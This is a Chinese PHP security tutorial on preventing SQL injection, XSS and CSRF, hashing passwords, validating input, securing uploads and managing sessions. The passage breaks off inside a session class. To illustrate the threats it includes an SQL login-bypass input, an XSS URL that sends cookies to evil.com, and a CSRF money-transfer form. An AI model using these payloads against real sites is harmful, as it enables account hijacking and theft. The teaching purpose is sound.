---
title: 安全最佳实践
description: PHP安全完全指南，SQL注入、XSS、CSRF防护与密码处理
track: php
section: performance-security
difficulty: intermediate
tags:
  - PHP
  - 安全
  - SQL注入
  - XSS
status: imported
origin: old/src/content/docs/php/security.zh.md
divergence: 0.337
issues: []
legacy:
  category: PHP
  subcategory: 安全
  order: 6
  lastUpdated: 2026-01-07
---

安全是 Web 开发中最重要的环节之一。本文将全面介绍 PHP 应用中常见的安全威胁及其防护措施，帮助你构建更加安全的应用程序。

---

## SQL 注入防护

SQL 注入是最常见也是最危险的 Web 安全漏洞之一。攻击者通过在用户输入中插入恶意 SQL 代码，可能获取、修改甚至删除数据库中的数据。

### 漏洞示例

以下是一个典型的 SQL 注入漏洞代码：

```php
// 危险：直接将用户输入拼接到 SQL 语句中
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $sql);
```

攻击者可以输入如下内容绕过登录验证：

```
用户名: admin' --
密码: 任意内容
```

生成的 SQL 语句变为：

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '任意内容'
```

`--` 后面的内容被注释掉，攻击者无需密码即可登录。

### 防护方法一：预处理语句（推荐）

使用 PDO 预处理语句是防止 SQL 注入的最佳方法：

```php
<?php
// 使用 PDO 预处理语句
$pdo = new PDO('mysql:host=localhost;dbname=myapp;charset=utf8mb4', $user, $pass, [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES => false, // 使用真正的预处理语句
]);

$username = $_POST['username'];
$password = $_POST['password'];

// 使用占位符
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $username]);
$user = $stmt->fetch();

// 验证密码（使用 password_verify，后文详述）
if ($user && password_verify($password, $user['password_hash'])) {
    // 登录成功
}
```

使用 MySQLi 预处理语句：

```php
<?php
$mysqli = new mysqli('localhost', 'user', 'password', 'database');

$username = $_POST['username'];

$stmt = $mysqli->prepare('SELECT id, username, email FROM users WHERE username = ?');
$stmt->bind_param('s', $username); // 's' 表示字符串类型
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();
```

### 防护方法二：参数类型验证

对于数值类型的参数，确保进行类型转换：

```php
<?php
// 确保 ID 是整数
$id = (int) $_GET['id'];

// 或使用 filter_var
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die('无效的 ID');
}

$stmt = $pdo->prepare('SELECT * FROM products WHERE id = :id');
$stmt->execute(['id' => $id]);
```

### 防护方法三：白名单验证

对于动态表名或列名（无法使用预处理语句的场景）：

```php
<?php
// 白名单验证排序字段
$allowedColumns = ['id', 'username', 'created_at', 'email'];
$orderBy = $_GET['sort'] ?? 'id';

if (!in_array($orderBy, $allowedColumns, true)) {
    $orderBy = 'id'; // 默认值
}

// 白名单验证排序方向
$direction = strtoupper($_GET['direction'] ?? 'ASC');
if (!in_array($direction, ['ASC', 'DESC'], true)) {
    $direction = 'ASC';
}

$sql = "SELECT * FROM users ORDER BY {$orderBy} {$direction}";
$stmt = $pdo->query($sql);
```

---

## XSS 跨站脚本攻击防护

XSS（Cross-Site Scripting）攻击允许攻击者在受害者的浏览器中执行恶意脚本，可能导致会话劫持、敏感信息泄露等问题。

### XSS 攻击类型

1. **反射型 XSS**：恶意脚本通过 URL 参数传递并立即反射到页面
2. **存储型 XSS**：恶意脚本被存储到数据库，每次访问页面时执行
3. **DOM 型 XSS**：通过修改页面 DOM 结构执行恶意脚本

### 漏洞示例

```php
<!-- 危险：直接输出用户输入 -->
<div>搜索结果：<?php echo $_GET['keyword']; ?></div>

<!-- 攻击者可以构造如下 URL -->
<!-- example.com/search.php?keyword=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script> -->
```

### 防护方法一：输出转义

始终对输出到 HTML 的内容进行转义：

```php
<?php
// 使用 htmlspecialchars 转义 HTML 特殊字符
function escape(string $string): string
{
    return htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

// 在 HTML 上下文中使用
$keyword = $_GET['keyword'] ?? '';
?>

<div>搜索结果：<?= escape($keyword) ?></div>

<input type="text" name="username" value="<?= escape($username) ?>">
```

### 防护方法二：不同上下文的转义

不同的输出上下文需要不同的转义方法：

```php
<?php
class Escaper
{
    // HTML 内容转义
    public static function html(string $string): string
    {
        return htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }

    // HTML 属性转义
    public static function attr(string $string): string
    {
        return htmlspecialchars($string, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }

    // JavaScript 字符串转义
    public static function js(string $string): string
    {
        return json_encode($string, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
    }

    // URL 参数转义
    public static function url(string $string): string
    {
        return rawurlencode($string);
    }

    // CSS 转义
    public static function css(string $string): string
    {
        return preg_replace('/[^a-zA-Z0-9]/', '', $string);
    }
}
?>

<!-- HTML 上下文 -->
<p><?= Escaper::html($userComment) ?></p>

<!-- HTML 属性上下文 -->
<div data-name="<?= Escaper::attr($name) ?>"></div>

<!-- JavaScript 上下文 -->
<script>
    var username = <?= Escaper::js($username) ?>;
</script>

<!-- URL 上下文 -->
<a href="profile.php?name=<?= Escaper::url($name) ?>">查看资料</a>
```

### 防护方法三：Content Security Policy（CSP）

通过 HTTP 头设置 CSP，限制页面可以加载的资源：

```php
<?php
// 设置 CSP 头
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{$nonce}'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';");

// 生成随机 nonce
function generateNonce(): string
{
    return base64_encode(random_bytes(16));
}

$nonce = generateNonce();
?>

<!-- 只有带有正确 nonce 的脚本才会执行 -->
<script nonce="<?= $nonce ?>">
    // 这段脚本会执行
    console.log('安全的脚本');
</script>

<script>
    // 这段脚本不会执行（没有 nonce）
    console.log('可能是恶意脚本');
</script>
```

### 防护方法四：使用模板引擎

现代模板引擎默认自动转义输出：

```php
<?php
// 使用 Twig 模板引擎示例
require_once 'vendor/autoload.php';

$loader = new \Twig\Loader\FilesystemLoader('templates');
$twig = new \Twig\Environment($loader, [
    'autoescape' => 'html', // 自动转义
]);

echo $twig->render('profile.html.twig', [
    'username' => $username,
    'bio' => $bio,
]);
```

```twig
{# templates/profile.html.twig #}
{# 自动转义，安全 #}
<h1>{{ username }}</h1>
<p>{{ bio }}</p>

{# 如果确实需要输出原始 HTML（谨慎使用）#}
<div>{{ trusted_html|raw }}</div>
```

---

## CSRF 跨站请求伪造防护

CSRF（Cross-Site Request Forgery）攻击利用用户的登录状态，诱使用户在不知情的情况下执行恶意操作。

### 攻击原理

```html
<!-- 攻击者网站上的恶意代码 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- 或者使用表单 -->
<form action="https://bank.com/transfer" method="POST" id="maliciousForm">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('maliciousForm').submit();</script>
```

### 防护方法一：CSRF Token

生成并验证 CSRF Token：

```php
<?php
class CsrfProtection
{
    private const TOKEN_NAME = 'csrf_token';
    private const TOKEN_LENGTH = 32;

    /**
     * 生成 CSRF Token
     */
    public static function generateToken(): string
    {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }

        $token = bin2hex(random_bytes(self::TOKEN_LENGTH));
        $_SESSION[self::TOKEN_NAME] = $token;

        return $token;
    }

    /**
     * 获取当前 Token（如果不存在则生成）
     */
    public static function getToken(): string
    {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }

        if (empty($_SESSION[self::TOKEN_NAME])) {
            return self::generateToken();
        }

        return $_SESSION[self::TOKEN_NAME];
    }

    /**
     * 验证 Token
     */
    public static function validateToken(?string $token): bool
    {
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }

        if (empty($token) || empty($_SESSION[self::TOKEN_NAME])) {
            return false;
        }

        // 使用时间安全的比较函数
        return hash_equals($_SESSION[self::TOKEN_NAME], $token);
    }

    /**
     * 生成隐藏的表单字段
     */
    public static function getFormField(): string
    {
        $token = self::getToken();
        return sprintf(
            '<input type="hidden" name="%s" value="%s">',
            htmlspecialchars(self::TOKEN_NAME),
            htmlspecialchars($token)
        );
    }

    /**
     * 验证请求（失败时抛出异常）
     */
    public static function validateRequest(): void
    {
        $token = $_POST[self::TOKEN_NAME] ?? $_SERVER['HTTP_X_CSRF_TOKEN'] ?? null;

        if (!self::validateToken($token)) {
            http_response_code(403);
            throw new RuntimeException('CSRF token 验证失败');
        }
    }
}
```

在表单中使用：

```php
<?php
session_start();
?>

<form method="POST" action="/account/update">
    <?= CsrfProtection::getFormField() ?>

    <label for="email">邮箱：</label>
    <input type="email" id="email" name="email" required>

    <button type="submit">更新</button>
</form>
```

在处理程序中验证：

```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        CsrfProtection::validateRequest();

        // Token 验证通过，处理表单
        $email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
        if ($email) {
            // 更新邮箱
            updateUserEmail($userId, $email);
        }
    } catch (RuntimeException $e) {
        // Token 验证失败
        die('安全验证失败，请刷新页面重试');
    }
}
```

### 防护方法二：SameSite Cookie 属性

设置 Cookie 的 SameSite 属性防止跨站请求携带 Cookie：

```php
<?php
// PHP 7.3+
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => true,      // 仅 HTTPS
    'httponly' => true,    // 禁止 JavaScript 访问
    'samesite' => 'Strict' // 严格模式：完全禁止跨站请求携带 Cookie
    // 或 'Lax'：允许顶级导航的 GET 请求携带 Cookie
]);

session_start();

// 手动设置 Cookie 时
setcookie('user_preference', $value, [
    'expires' => time() + 86400,
    'path' => '/',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

### 防护方法三：验证 Referer/Origin

作为额外的安全层，验证请求来源：

```php
<?php
function validateRequestOrigin(): bool
{
    $allowedOrigins = [
        'https://www.example.com',
        'https://example.com'
    ];

    // 检查 Origin 头
    $origin = $_SERVER['HTTP_ORIGIN'] ?? null;
    if ($origin && in_array($origin, $allowedOrigins, true)) {
        return true;
    }

    // 检查 Referer 头
    $referer = $_SERVER['HTTP_REFERER'] ?? null;
    if ($referer) {
        $refererHost = parse_url($referer, PHP_URL_HOST);
        $allowedHosts = array_map(fn($url) => parse_url($url, PHP_URL_HOST), $allowedOrigins);

        if (in_array($refererHost, $allowedHosts, true)) {
            return true;
        }
    }

    return false;
}
```

---

## 密码安全处理

正确处理用户密码是保护用户账户安全的关键。

### 错误做法

```php
<?php
// 危险：明文存储密码
$password = $_POST['password'];
$sql = "INSERT INTO users (username, password) VALUES (?, ?)";
$stmt->execute([$username, $password]);

// 危险：使用 MD5 或 SHA1
$passwordHash = md5($password);
$passwordHash = sha1($password);

// 危险：简单加盐
$passwordHash = md5($password . 'fixed_salt');
```

### 正确做法：使用 password_hash

PHP 内置的 `password_hash()` 函数是处理密码的最佳方式：

```php
<?php
class PasswordManager
{
    /**
     * 哈希密码
     */
    public static function hash(string $password): string
    {
        return password_hash($password, PASSWORD_DEFAULT, [
            'cost' => 12 // 可根据服务器性能调整，推荐 10-12
        ]);
    }

    /**
     * 验证密码
     */
    public static function verify(string $password, string $hash): bool
    {
        return password_verify($password, $hash);
    }

    /**
     * 检查是否需要重新哈希（算法升级时）
     */
    public static function needsRehash(string $hash): bool
    {
        return password_needs_rehash($hash, PASSWORD_DEFAULT, [
            'cost' => 12
        ]);
    }
}
```

完整的用户注册和登录示例：

```php
<?php
class UserAuth
{
    private PDO $pdo;

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
    }

    /**
     * 用户注册
     */
    public function register(string $username, string $email, string $password): bool
    {
        // 验证密码强度
        if (!$this->isPasswordStrong($password)) {
            throw new InvalidArgumentException('密码不够强');
        }

        // 哈希密码
        $passwordHash = PasswordManager::hash($password);

        $stmt = $this->pdo->prepare(
            'INSERT INTO users (username, email, password_hash, created_at) VALUES (?, ?, ?, NOW())'
        );

        return $stmt->execute([$username, $email, $passwordHash]);
    }

    /**
     * 用户登录
     */
    public function login(string $username, string $password): ?array
    {
        $stmt = $this->pdo->prepare(
            'SELECT id, username, email, password_hash FROM users WHERE username = ?'
        );
        $stmt->execute([$username]);
        $user = $stmt->fetch();

        if (!$user) {
            // 用户不存在，但为了防止用户名枚举，仍执行密码验证
            PasswordManager::verify($password, '$2y$12$dummy.hash.to.prevent.timing.attacks');
            return null;
        }

        if (!PasswordManager::verify($password, $user['password_hash'])) {
            return null;
        }

        // 检查是否需要重新哈希
        if (PasswordManager::needsRehash($user['password_hash'])) {
            $newHash = PasswordManager::hash($password);
            $this->updatePasswordHash($user['id'], $newHash);
        }

        // 移除敏感信息后返回
        unset($user['password_hash']);
        return $user;
    }

    /**
     * 验证密码强度
     */
    private function isPasswordStrong(string $password): bool
    {
        // 至少 8 个字符
        if (strlen($password) < 8) {
            return false;
        }

        // 包含大写字母
        if (!preg_match('/[A-Z]/', $password)) {
            return false;
        }

        // 包含小写字母
        if (!preg_match('/[a-z]/', $password)) {
            return false;
        }

        // 包含数字
        if (!preg_match('/[0-9]/', $password)) {
            return false;
        }

        // 包含特殊字符（可选但推荐）
        // if (!preg_match('/[!@#$%^&*(),.?":{}|<>]/', $password)) {
        //     return false;
        // }

        return true;
    }

    /**
     * 更新密码哈希
     */
    private function updatePasswordHash(int $userId, string $newHash): void
    {
        $stmt = $this->pdo->prepare('UPDATE users SET password_hash = ? WHERE id = ?');
        $stmt->execute([$newHash, $userId]);
    }
}
```

### 密码重置安全

```php
<?php
class PasswordReset
{
    private PDO $pdo;
    private const TOKEN_EXPIRY = 3600; // 1 小时

    public function __construct(PDO $pdo)
    {
        $this->pdo = $pdo;
    }

    /**
     * 生成密码重置令牌
     */
    public function createResetToken(string $email): ?string
    {
        // 查找用户
        $stmt = $this->pdo->prepare('SELECT id FROM users WHERE email = ?');
        $stmt->execute([$email]);
        $user = $stmt->fetch();

        if (!$user) {
            // 不透露用户是否存在
            return null;
        }

        // 生成安全令牌
        $token = bin2hex(random_bytes(32));
        $tokenHash = hash('sha256', $token);
        $expiresAt = date('Y-m-d H:i:s', time() + self::TOKEN_EXPIRY);

        // 存储令牌哈希（不存储原始令牌）
        $stmt = $this->pdo->prepare(
            'INSERT INTO password_resets (user_id, token_hash, expires_at) VALUES (?, ?, ?)'
        );
        $stmt->execute([$user['id'], $tokenHash, $expiresAt]);

        return $token;
    }

    /**
     * 验证并使用重置令牌
     */
    public function resetPassword(string $token, string $newPassword): bool
    {
        $tokenHash = hash('sha256', $token);

        $stmt = $this->pdo->prepare(
            'SELECT user_id FROM password_resets
             WHERE token_hash = ? AND expires_at > NOW() AND used_at IS NULL'
        );
        $stmt->execute([$tokenHash]);
        $reset = $stmt->fetch();

        if (!$reset) {
            return false;
        }

        // 更新密码
        $passwordHash = PasswordManager::hash($newPassword);
        $stmt = $this->pdo->prepare('UPDATE users SET password_hash = ? WHERE id = ?');
        $stmt->execute([$passwordHash, $reset['user_id']]);

        // 标记令牌为已使用
        $stmt = $this->pdo->prepare('UPDATE password_resets SET used_at = NOW() WHERE token_hash = ?');
        $stmt->execute([$tokenHash]);

        // 可选：使该用户的所有会话失效
        $this->invalidateUserSessions($reset['user_id']);

        return true;
    }

    private function invalidateUserSessions(int $userId): void
    {
        // 实现会话失效逻辑
    }
}
```

---

## 输入验证与过滤

永远不要信任用户输入。所有外部数据都应该经过验证和过滤。

### 使用 filter_var 函数

```php
<?php
class InputValidator
{
    /**
     * 验证邮箱
     */
    public static function email(string $email): ?string
    {
        $filtered = filter_var($email, FILTER_VALIDATE_EMAIL);
        return $filtered !== false ? $filtered : null;
    }

    /**
     * 验证整数
     */
    public static function integer($value, ?int $min = null, ?int $max = null): ?int
    {
        $options = [];
        if ($min !== null) $options['min_range'] = $min;
        if ($max !== null) $options['max_range'] = $max;

        $filtered = filter_var($value, FILTER_VALIDATE_INT,
            empty($options) ? null : ['options' => $options]
        );

        return $filtered !== false ? $filtered : null;
    }

    /**
     * 验证浮点数
     */
    public static function float($value): ?float
    {
        $filtered = filter_var($value, FILTER_VALIDATE_FLOAT);
        return $filtered !== false ? $filtered : null;
    }

    /**
     * 验证 URL
     */
    public static function url(string $url): ?string
    {
        $filtered = filter_var($url, FILTER_VALIDATE_URL);
        return $filtered !== false ? $filtered : null;
    }

    /**
     * 验证布尔值
     */
    public static function boolean($value): ?bool
    {
        $filtered = filter_var($value, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE);
        return $filtered;
    }

    /**
     * 验证 IP 地址
     */
    public static function ip(string $ip, bool $allowPrivate = false): ?string
    {
        $flags = FILTER_FLAG_IPV4 | FILTER_FLAG_IPV6;
        if (!$allowPrivate) {
            $flags |= FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE;
        }

        $filtered = filter_var($ip, FILTER_VALIDATE_IP, $flags);
        return $filtered !== false ? $filtered : null;
    }

    /**
     * 清理字符串（移除标签和特殊字符）
     */
    public static function sanitizeString(string $string): string
    {
        return filter_var($string, FILTER_SANITIZE_SPECIAL_CHARS);
    }
}

// 使用示例
$email = InputValidator::email($_POST['email'] ?? '');
if ($email === null) {
    $errors[] = '请输入有效的邮箱地址';
}

$age = InputValidator::integer($_POST['age'] ?? '', 0, 150);
if ($age === null) {
    $errors[] = '请输入有效的年龄';
}

$website = InputValidator::url($_POST['website'] ?? '');
if ($_POST['website'] && $website === null) {
    $errors[] = '请输入有效的网址';
}
```

### 自定义验证规则

```php
<?php
class Validator
{
    private array $data;
    private array $errors = [];

    public function __construct(array $data)
    {
        $this->data = $data;
    }

    public function required(string $field, string $message = null): self
    {
        if (empty($this->data[$field])) {
            $this->errors[$field][] = $message ?? "{$field} 是必填项";
        }
        return $this;
    }

    public function email(string $field, string $message = null): self
    {
        if (!empty($this->data[$field])) {
            if (!filter_var($this->data[$field], FILTER_VALIDATE_EMAIL)) {
                $this->errors[$field][] = $message ?? "请输入有效的邮箱地址";
            }
        }
        return $this;
    }

    public function minLength(string $field, int $length, string $message = null): self
    {
        if (!empty($this->data[$field])) {
            if (mb_strlen($this->data[$field]) < $length) {
                $this->errors[$field][] = $message ?? "{$field} 至少需要 {$length} 个字符";
            }
        }
        return $this;
    }

    public function maxLength(string $field, int $length, string $message = null): self
    {
        if (!empty($this->data[$field])) {
            if (mb_strlen($this->data[$field]) > $length) {
                $this->errors[$field][] = $message ?? "{$field} 不能超过 {$length} 个字符";
            }
        }
        return $this;
    }

    public function regex(string $field, string $pattern, string $message = null): self
    {
        if (!empty($this->data[$field])) {
            if (!preg_match($pattern, $this->data[$field])) {
                $this->errors[$field][] = $message ?? "{$field} 格式不正确";
            }
        }
        return $this;
    }

    public function confirmed(string $field, string $confirmField, string $message = null): self
    {
        if (($this->data[$field] ?? '') !== ($this->data[$confirmField] ?? '')) {
            $this->errors[$field][] = $message ?? "两次输入不一致";
        }
        return $this;
    }

    public function isValid(): bool
    {
        return empty($this->errors);
    }

    public function getErrors(): array
    {
        return $this->errors;
    }
}

// 使用示例
$validator = new Validator($_POST);
$validator
    ->required('username', '用户名不能为空')
    ->minLength('username', 3, '用户名至少 3 个字符')
    ->maxLength('username', 20, '用户名最多 20 个字符')
    ->regex('username', '/^[a-zA-Z0-9_]+$/', '用户名只能包含字母、数字和下划线')
    ->required('email', '邮箱不能为空')
    ->email('email', '请输入有效的邮箱地址')
    ->required('password', '密码不能为空')
    ->minLength('password', 8, '密码至少 8 个字符')
    ->confirmed('password', 'password_confirmation', '两次密码输入不一致');

if (!$validator->isValid()) {
    $errors = $validator->getErrors();
    // 处理验证错误
}
```

---

## 文件上传安全

文件上传功能如果处理不当，可能导致严重的安全问题，包括任意代码执行。

### 常见攻击方式

1. 上传恶意 PHP 文件并执行
2. 利用文件名进行目录遍历攻击
3. 上传超大文件导致拒绝服务
4. 利用图片文件嵌入恶意代码

### 安全的文件上传实现

```php
<?php
class SecureFileUploader
{
    private string $uploadDir;
    private array $allowedMimeTypes;
    private array $allowedExtensions;
    private int $maxFileSize;

    public function __construct(
        string $uploadDir,
        array $allowedMimeTypes = [],
        array $allowedExtensions = [],
        int $maxFileSize = 5 * 1024 * 1024 // 默认 5MB
    ) {
        $this->uploadDir = rtrim($uploadDir, '/');
        $this->allowedMimeTypes = $allowedMimeTypes;
        $this->allowedExtensions = $allowedExtensions;
        $this->maxFileSize = $maxFileSize;
    }

    /**
     * 上传文件
     */
    public function upload(array $file): array
    {
        // 检查上传错误
        if ($file['error'] !== UPLOAD_ERR_OK) {
            throw new RuntimeException($this->getUploadErrorMessage($file['error']));
        }

        // 检查文件大小
        if ($file['size'] > $this->maxFileSize) {
            throw new RuntimeException('文件大小超过限制');
        }

        // 验证 MIME 类型（使用 fileinfo 扩展，更可靠）
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mimeType = $finfo->file($file['tmp_name']);

        if (!empty($this->allowedMimeTypes) && !in_array($mimeType, $this->allowedMimeTypes, true)) {
            throw new RuntimeException('不支持的文件类型');
        }

        // 验证文件扩展名
        $originalName = $file['name'];
        $extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

        if (!empty($this->allowedExtensions) && !in_array($extension, $this->allowedExtensions, true)) {
            throw new RuntimeException('不支持的文件扩展名');
        }

        // 生成安全的文件名
        $newFileName = $this->generateSecureFileName($extension);
        $destination = $this->uploadDir . '/' . $newFileName;

        // 确保目标目录存在
        if (!is_dir($this->uploadDir)) {
            mkdir($this->uploadDir, 0755, true);
        }

        // 移动文件
        if (!move_uploaded_file($file['tmp_name'], $destination)) {
            throw new RuntimeException('文件保存失败');
        }

        // 设置安全权限（只读）
        chmod($destination, 0644);

        return [
            'original_name' => $originalName,
            'saved_name' => $newFileName,
            'mime_type' => $mimeType,
            'size' => $file['size'],
            'path' => $destination,
        ];
    }

    /**
     * 生成安全的随机文件名
     */
    private function generateSecureFileName(string $extension): string
    {
        return bin2hex(random_bytes(16)) . '.' . $extension;
    }

    /**
     * 获取上传错误信息
     */
    private function getUploadErrorMessage(int $errorCode): string
    {
        return match ($errorCode) {
            UPLOAD_ERR_INI_SIZE => '文件大小超过 php.ini 中的限制',
            UPLOAD_ERR_FORM_SIZE => '文件大小超过表单中的限制',
            UPLOAD_ERR_PARTIAL => '文件只被部分上传',
            UPLOAD_ERR_NO_FILE => '没有文件被上传',
            UPLOAD_ERR_NO_TMP_DIR => '找不到临时文件夹',
            UPLOAD_ERR_CANT_WRITE => '文件写入失败',
            UPLOAD_ERR_EXTENSION => '上传被扩展阻止',
            default => '未知上传错误',
        };
    }
}

// 使用示例：上传图片
$uploader = new SecureFileUploader(
    uploadDir: '/var/www/uploads/images',
    allowedMimeTypes: ['image/jpeg', 'image/png', 'image/gif', 'image/webp'],
    allowedExtensions: ['jpg', 'jpeg', 'png', 'gif', 'webp'],
    maxFileSize: 2 * 1024 * 1024 // 2MB
);

try {
    if (isset($_FILES['avatar'])) {
        $result = $uploader->upload($_FILES['avatar']);
        echo "文件上传成功: " . $result['saved_name'];
    }
} catch (RuntimeException $e) {
    echo "上传失败: " . $e->getMessage();
}
```

### 图片文件额外验证

对于图片文件，进行额外的验证：

```php
<?php
class ImageValidator
{
    /**
     * 验证是否是真正的图片
     */
    public static function isValidImage(string $filePath): bool
    {
        // 尝试获取图片信息
        $imageInfo = @getimagesize($filePath);
        if ($imageInfo === false) {
            return false;
        }

        // 检查图片类型
        $validTypes = [IMAGETYPE_JPEG, IMAGETYPE_PNG, IMAGETYPE_GIF, IMAGETYPE_WEBP];
        if (!in_array($imageInfo[2], $validTypes, true)) {
            return false;
        }

        return true;
    }

    /**
     * 重新处理图片（移除潜在的恶意代码）
     */
    public static function sanitizeImage(string $sourcePath, string $destPath): bool
    {
        $imageInfo = getimagesize($sourcePath);
        if ($imageInfo === false) {
            return false;
        }

        // 根据图片类型创建图片资源
        $sourceImage = match ($imageInfo[2]) {
            IMAGETYPE_JPEG => imagecreatefromjpeg($sourcePath),
            IMAGETYPE_PNG => imagecreatefrompng($sourcePath),
            IMAGETYPE_GIF => imagecreatefromgif($sourcePath),
            IMAGETYPE_WEBP => imagecreatefromwebp($sourcePath),
            default => false,
        };

        if ($sourceImage === false) {
            return false;
        }

        // 创建新图片（这会移除所有元数据和嵌入的代码）
        $width = imagesx($sourceImage);
        $height = imagesy($sourceImage);

        $newImage = imagecreatetruecolor($width, $height);

        // 处理透明度（PNG 和 GIF）
        if (in_array($imageInfo[2], [IMAGETYPE_PNG, IMAGETYPE_GIF], true)) {
            imagealphablending($newImage, false);
            imagesavealpha($newImage, true);
            $transparent = imagecolorallocatealpha($newImage, 0, 0, 0, 127);
            imagefilledrectangle($newImage, 0, 0, $width, $height, $transparent);
        }

        // 复制图片
        imagecopy($newImage, $sourceImage, 0, 0, 0, 0, $width, $height);

        // 保存新图片
        $result = match ($imageInfo[2]) {
            IMAGETYPE_JPEG => imagejpeg($newImage, $destPath, 90),
            IMAGETYPE_PNG => imagepng($newImage, $destPath, 9),
            IMAGETYPE_GIF => imagegif($newImage, $destPath),
            IMAGETYPE_WEBP => imagewebp($newImage, $destPath, 90),
            default => false,
        };

        // 释放资源
        imagedestroy($sourceImage);
        imagedestroy($newImage);

        return $result;
    }
}
```

### 上传目录安全配置

在上传目录中禁用 PHP 执行：

```apache
# .htaccess 文件放在上传目录中
# 禁用 PHP 执行
php_flag engine off

# 禁止直接访问 PHP 文件
<FilesMatch "\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>

# 设置 Content-Type
<FilesMatch "\.(jpg|jpeg|png|gif|webp)$">
    Header set Content-Type "image/*"
    Header set X-Content-Type-Options "nosniff"
</FilesMatch>
```

对于 Nginx：

```nginx
location /uploads {
    # 禁止执行 PHP
    location ~ \.php$ {
        deny all;
    }

    # 设置安全头
    add_header X-Content-Type-Options "nosniff";
    add_header Content-Disposition "attachment";
}
```

---

## 会话安全

会话管理不当可能导致会话劫持、会话固定等攻击。

### 安全的会话配置

```php
<?php
// 在 php.ini 或代码中配置
ini_set('session.cookie_httponly', 1);      // 禁止 JavaScript 访问 Cookie
ini_set('session.cookie_secure', 1);         // 仅 HTTPS 传输
ini_set('session.cookie_samesite', 'Strict'); // 防止 CSRF
ini_set('session.use_strict_mode', 1);       // 严格模式
ini_set('session.use_only_cookies', 1);      // 仅使用 Cookie
ini_set('session.use_trans_sid', 0);         // 禁止 URL 传递会话 ID

// 或使用 session_set_cookie_params
session_set_cookie_params([
    'lifetime' => 0,           // 浏览器关闭时过期
    'path' => '/',
    'domain' => '',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
```

### 安全的会话管理类

```php
<?php
class SecureSession
{
    private const SESSION_LIFETIME = 3600;     // 1 小时
    private const REGENERATE_INTERVAL = 300;   // 5 分钟重新生成 ID

    /**
     * 启动安全会话
     */
    public static function start(): void
    {
        if (session_status() === PHP_SESSION_ACTIVE) {
            return;
        }

        // 配置会话参数
        session_set_cookie_params([
            'lifetime' => 0,
            'path' => '/',
            'domain' => '',
            'secure' => isset($_SERVER['HTTPS']),
            'httponly' => true,
            'samesite' => 'Strict'
        ]);

        session_start();

        // 验证会话
        self::validateSession();

        // 定期重新生成会话 ID
        self::regenerateIfNeeded();
    }

    /**
     * 验证会话有效性
     */
    private static function validateSession(): void
    {
        $now = time();

        // 检查会话是否过期
        if (isset($_SESSION['_last_activity'])) {
            if ($now - $_SESSION['_last_activity'] > self::SESSION_LIFETIME) {
                self::destroy();
                throw new RuntimeException('会话已过期');
            }
        }

        // 检查 IP 地址（可选，可能导致移动网络用户问题）
        // if (isset($_SESSION['_ip']) && $_SESSION['_ip'] !== $_SERVER['REMOTE_ADDR']) {
        //     self::destroy();
        //     throw new RuntimeException('会话 IP 不匹配');
        // }

        // 检查 User-Agent
        if (isset($_SESSION['_user_agent'])) {
            if ($_SESSION['_user_agent'] !== ($_SERVER['HTTP_USER_AGENT'] ?? '')) {
                self::destroy();
                throw new RuntimeException('会话 User-Agent 不匹配');
            }
        }

        // 更新活动时间
        $_SESSION['_last_activity'] = $now;

        // 初始化会话变量
        if (!isset($_SESSION['_created'])) {
            $_SESSION['_created'] = $now;
            $_SESSION['_user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? '';
            $_SESSION['_ip'] = $_SERVER['REMOTE_ADDR'];
        }
    }

    /**
     * 定期重新生成会话 ID
     */
    private static function regenerateIfNeeded(): void
    {
        $now = time();

        if (!isset($_SESSION['_regenerated'])) {
            $_SESSION['_regenerated'] = $now;
            return;
        }

        if ($now - $_SESSION['_regenerated'] > self::REGENERATE_INTERVAL) {
            self::regenerate();
        }
    }

    /**
     * 重新生成会话 ID
     */
    public static function regenerate(): void
    {
        session_regenerate_id(true);
        $_SESSION['_regenerated'] = time();
    }

    /**
     * 登录后的会话处理
     */
    public static function login(int $userId, array $userData = []): void
    {
        // 重新生成会话 ID（防止会话固定攻击）
        self::regenerate();

        $_SESSION['user_id'] = $userId;
        $_SESSION['user_data'] = $userData;
        $_SESSION['logged_in_at'] = time();
    }

    /**
     * 登出
     */
    public static function logout(): void
    {
        self::destroy();
    }

    /**
     * 销毁会话
     */
    public static function destroy(): void
    {
        $_SESSION = [];

        if (ini_get('session.use_cookies')) {
            $params = session_get_cookie_params();
            setcookie(
                session_name(),
                '',
                time() - 42000,
                $params['path'],
                $params['domain'],
                $params['secure'],
                $params['httponly']
            );
        }

